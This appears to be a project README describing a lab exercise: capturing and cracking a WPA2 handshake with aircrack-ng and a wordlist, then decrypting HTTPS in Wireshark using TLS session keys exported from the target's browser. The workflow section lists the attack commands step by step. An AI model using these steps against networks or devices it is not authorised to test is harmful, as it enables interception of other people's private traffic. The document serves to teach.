# Wireshark TLS Decryption & WPA2 Traffic Analysis

This project demonstrates the process of capturing, decrypting, and analyzing encrypted Wi-Fi traffic using Wireshark. The goal was to exploit a WPA2-secured wireless network to gain visibility into otherwise encrypted HTTPS traffic by leveraging both WPA2 handshake cracking and TLS session key extraction.

---

## 🔧 Tools & Environment

- Kali Linux (VirtualBox)
- External Wi-Fi Adapter (monitor mode + packet injection)
- Wireshark
- aircrack-ng
- rockyou.txt wordlist
- Firefox (on target system)
- TLS Session Key Logging

---

## 🛠️ Project Workflow

```bash
# 1. Enable Monitor Mode
sudo airmon-ng start wlan0

# 2. Capture the WPA2 Handshake
sudo airodump-ng wlan0mon

# 3. Use aircrack-ng to Crack the Handshake
aircrack-ng -w rockyou.txt -b <target-BSSID> capturefile.cap

# 4. Load the Cracked Password into Wireshark for WPA2 Decryption:
# Go to: Edit → Preferences → Protocols → IEEE 802.11
# Enable decryption and add the Wi-Fi password as a WPA-PWK key

# 5. Export TLS Session Keys from Firefox on Target Machine
# On the target machine:
export SSLKEYLOGFILE=/path/to/sessionkeys.log

# 6. Load the TLS Keys into Wireshark
# Go to: Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename → Browse to sessionkeys.log

# 7. Analyze Decrypted HTTPS Traffic
# Apply filters like:
tls
http
ip.addr == <target IP>

**Key Objectives**

Capture and crack a WPA2 4-way handshake

Extract TLS session keys using browser environment variables

Load and apply session keys to decrypt HTTPS streams in Wireshark

Identify decrypted TCP, HTTP, and TLS payloads from a specific device

**Takeaways**

WPA2 encryption can be broken if the passphrase is weak

TLS traffic can be decrypted if session keys are obtained

Combining wireless traffic capture with browser key export enables full visibility into encrypted sessions

Encryption ≠ invincibility — endpoint security matters
